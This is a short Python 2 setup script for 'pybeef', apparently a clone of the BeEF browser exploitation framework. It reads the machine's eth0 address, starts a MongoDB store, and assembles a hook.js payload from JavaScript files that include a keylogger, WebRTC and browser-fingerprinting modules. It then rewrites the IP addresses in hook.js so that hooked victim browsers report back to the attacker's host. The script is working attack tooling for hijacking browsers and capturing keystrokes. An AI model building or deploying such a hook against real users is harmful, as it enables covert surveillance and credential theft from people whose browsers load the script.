import socket
import fcntl
import struct
import os   
import fileinput
import subprocess 
import re 

current_path = os.path.abspath('.')
hook_path = "/root/pybeef/templates/static/hook.js"

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

def start_database():
#    data_msg = os.popen("mongod --dbpath "+current_path+"/data")
    cmd = "mongod --dbpath "+current_path+"/data & > /dev/null" 
    child = subprocess.Popen(args=cmd,shell=True)   
    print "start mongodb pid: "+str(child.pid)
    child.wait()

def config_hook(ip):
    for line in fileinput.input(hook_path,inplace=True):
        p = re.search(r"\d+\.\d+\.\d+\.\d+",line)
        if p:
            print line.replace(p.group(),ip),
        else:
            print line,
    fileinput.close()

def gen_hook():
    os.chdir("/root/pybeef/templates/static/")
    fp_hook = open('hook.js','w')
    fp_hook.truncate()
    for file_name in ['jquery-3.1.1.js','request.js','webrtc.js','pybeef.js',
    'browser_me.js','keylogger.js']:
        with open(file_name) as f:
            f_js = f.read()
        fp_hook.write(f_js)

def beef_init():
    ip = get_ip_address("eth0")
    print "get local ip address :"+ip
    
    print "start database..."
    start_database()
    print "generate hook.js"
    gen_hook()

    print "config hook.js"
    config_hook(ip)
    
    print "exit"

